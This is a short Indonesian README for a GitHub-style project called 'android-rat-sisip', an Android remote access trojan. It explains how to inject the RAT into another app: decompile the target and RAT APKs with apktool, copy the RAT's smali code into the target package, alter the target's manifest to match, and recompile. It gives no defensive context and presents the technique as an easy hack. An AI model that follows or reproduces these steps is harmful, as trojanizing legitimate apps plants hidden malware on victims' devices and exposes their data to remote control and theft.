# android-rat-sisip
Hack android apk akses melalui internal root database
# Configure
- pertama decompile apk target terlebih dahulu menggunakan apktool
- kedua decompile apk ini(rat) menggunakan apktool
- salin code smali com/shun/.. di com/targetapk
- edit AndroidManifest.xml menyerupai AnfroidManifest.xml di apk rat ini
- lalu compile kembali

# Catatan
aplikasi ini tidak menggunakan xml script jadi tidak ribet cwim
